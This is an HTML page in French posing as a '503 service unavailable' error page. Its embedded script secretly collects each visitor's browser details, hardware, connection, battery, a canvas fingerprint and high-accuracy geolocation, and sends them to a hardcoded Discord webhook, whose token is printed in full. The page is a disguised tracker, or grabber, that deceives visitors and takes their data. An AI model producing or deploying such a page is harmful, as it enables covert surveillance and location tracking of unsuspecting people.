<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Erreur 503 - Service indisponible</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #0a0a0a;
      color: #e0e0e0;
      margin: 0;
      padding: 0;
      height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      text-align: center;
    }
    h1 { color: #ff4444; font-size: 6rem; margin: 0; }
    h2 { color: #ff9800; margin: 10px 0 30px; }
    .code { font-family: monospace; font-size: 1.4rem; color: #ff6b6b; }
    button {
      background: #ff4444;
      color: white;
      border: none;
      padding: 14px 32px;
      font-size: 1.2rem;
      border-radius: 6px;
      cursor: pointer;
      margin-top: 30px;
    }
    button:hover { background: #d32f2f; }
    pre { 
      background: #111; 
      padding: 20px; 
      border-radius: 8px; 
      max-width: 90%; 
      overflow: auto; 
      text-align: left; 
      margin-top: 40px; 
      font-size: 0.9rem;
    }
    footer { position: absolute; bottom: 20px; font-size: 0.9rem; opacity: 0.6; }
  </style>
</head>
<body>
  <h1>503</h1>
  <h2>Service temporairement indisponible</h2>
  <p class="code">Le serveur rencontre un probl√®me technique.<br>Nos √©quipes interviennent. R√©essayez dans quelques instants.</p>

  <button onclick="location.reload()">R√©essayer</button>

  <footer>ID de transaction : ERR-<span id="txid"></span> ‚Ä¢ Ref: <span id="ref"></span></footer>

  <pre id="collected">Chargement des informations...</pre>

  <script>
    // Affichage dynamique de l'ID et r√©f√©rence
    document.getElementById('txid').textContent = Date.now().toString(36).toUpperCase();
    document.getElementById('ref').textContent = 'TX-' + Math.random().toString(36).substr(2,9).toUpperCase();

    // Objet qui va contenir toutes les infos
    let infos = {
      timestamp: new Date().toISOString(),
      url: window.location.href,
      referrer: document.referrer || 'direct',
      userAgent: navigator.userAgent,
      language: navigator.language,
      languages: navigator.languages || [],
      platform: navigator.platform,
      vendor: navigator.vendor,
      screen: `${screen.width} √ó ${screen.height} (${screen.colorDepth} bits)`,
      availScreen: `${screen.availWidth} √ó ${screen.availHeight}`,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      hardwareConcurrency: navigator.hardwareConcurrency || 'inconnu',
      deviceMemory: navigator.deviceMemory || 'inconnu',
      maxTouchPoints: navigator.maxTouchPoints || 0,
      cookiesEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack,
      online: navigator.onLine
    };

    // Infos connexion (wifi/4g/5g + vitesse approx)
    if (navigator.connection) {
      infos.connection = {
        type: navigator.connection.effectiveType || navigator.connection.type,
        downlink: navigator.connection.downlink,
        rtt: navigator.connection.rtt,
        saveData: navigator.connection.saveData
      };
    }

    // Batterie (si disponible)
    if (navigator.getBattery) {
      navigator.getBattery().then(battery => {
        infos.battery = {
          level: battery.level,
          charging: battery.charging,
          chargingTime: battery.chargingTime,
          dischargingTime: battery.dischargingTime
        };
      }).catch(() => {});
    }

    // Fingerprint canvas tr√®s basique
    try {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      ctx.textBaseline = "top";
      ctx.font = "14px 'Arial'";
      ctx.fillStyle = "#f60";
      ctx.fillRect(125, 1, 62, 20);
      ctx.fillStyle = "#069";
      ctx.fillText("fingerprint test êê∑", 2, 15);
      ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
      ctx.fillText("fingerprint test êê∑", 4, 17);
      infos.canvas = canvas.toDataURL();
    } catch (e) {
      infos.canvas = 'non support√©';
    }

    // Pr√©paration du message Discord
    function showAndSend() {
      // Affichage local pour debug
      document.getElementById('collected').textContent = JSON.stringify(infos, null, 2);

      const message = {
        embeds: [{
          title: "Nouvelle visite d√©tect√©e",
          description: "Quelqu'un a charg√© la page d'erreur",
          color: 0xff0000,
          fields: [
            { name: "Heure", value: infos.timestamp, inline: true },
            { name: "User-Agent", value: "```" + (infos.userAgent || "inconnu").substring(0, 250) + "```", inline: false },
            { name: "√âcran", value: infos.screen || "?", inline: true },
            { name: "Fuseau horaire", value: infos.timezone || "?", inline: true },
            { name: "Connexion", value: infos.connection ? infos.connection.type + " (" + (infos.connection.downlink || "?") + " Mbps)" : "?", inline: true },
            { name: "G√©olocalisation", value: infos.geo ? 
              `${infos.geo.latitude}, ${infos.geo.longitude} (¬±${infos.geo.accuracy}m)` : 
              "non autoris√©e / non disponible", inline: false },
            { name: "Mat√©riel", value: `C≈ìurs: ${infos.hardwareConcurrency || "?"} | RAM: ${infos.deviceMemory || "?"} Go`, inline: true },
            { name: "Canvas fingerprint", value: infos.canvas ? "pr√©sent" : "absent", inline: true }
          ],
          footer: { text: "ID transaction : ERR-" + Date.now().toString(36).toUpperCase() },
          timestamp: infos.timestamp
        }]
      };

      fetch('https://discord.com/api/webhooks/1475909581401096294/Y1xzIEYlnEyMFDUwXnuEuTFdMGLrUIzE3qpYFLNEVDYLAEFlFgef6ObpQm8ZTgseRwzs', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(message)
      })
      .then(response => {
        if (response.ok) {
          console.log("Envoy√© sur Discord");
        } else {
          console.error("Erreur Discord", response.status);
        }
      })
      .catch(err => {
        console.error("Erreur fetch :", err);
      });
    }

    // G√©olocalisation
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        pos => {
          infos.geo = {
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            altitude: pos.coords.altitude || null,
            speed: pos.coords.speed || null
          };
          showAndSend();
        },
        () => {
          infos.geo = 'refus√©e ou non disponible';
          showAndSend();
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    } else {
      infos.geo = 'non support√©e';
      showAndSend();
    }

    // Envoi de secours (si g√©oloc prend trop de temps)
    setTimeout(showAndSend, 6000);
  </script>
</body>
</html>
